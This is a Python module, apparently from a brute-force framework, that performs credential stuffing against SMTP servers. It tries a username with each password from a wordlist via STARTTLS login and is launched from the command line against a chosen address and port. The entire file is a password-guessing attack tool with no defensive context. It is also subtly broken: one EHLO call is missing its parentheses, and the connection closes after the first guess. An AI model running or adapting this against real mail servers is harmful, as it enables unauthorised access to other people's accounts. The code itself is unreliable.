#!/usr/bin/env python3
"""
smtp.py

    Module Name:
        smtp

    Author:
        Core Maintainers

    Description:
        Protocol-based module for credential stuffing smtp
"""

import dataclasses
import smtplib

from brute.core.protocol import ProtocolBruteforce


@dataclasses.dataclass
class Smtp(ProtocolBruteforce):

    name = "smtp"
    port = 25


    @property
    def success(self) -> int:
        return 0


    def init(self):
        self.smtp = smtplib.SMTP(self.address, self.port)


    #def sanity(self):


    def brute(self, username, pwd_guess) -> int:
        status: int = 0
        try:
            self.smtp.ehlo()
            self.smtp.starttls()
            self.smtp.ehlo
            self.smtp.login(username, pwd_guess)
        except smtplib.SMTPAuthenticationError:
            status = -1

        self.smtp.close()
        return status


if __name__ == "__main__":
    args = Smtp.parse_args()
    Smtp(
        address = args.address,
        username = args.username,
        wordlist = args.wordlist,
        delay = args.delay,
        port = args.port
    ).run()
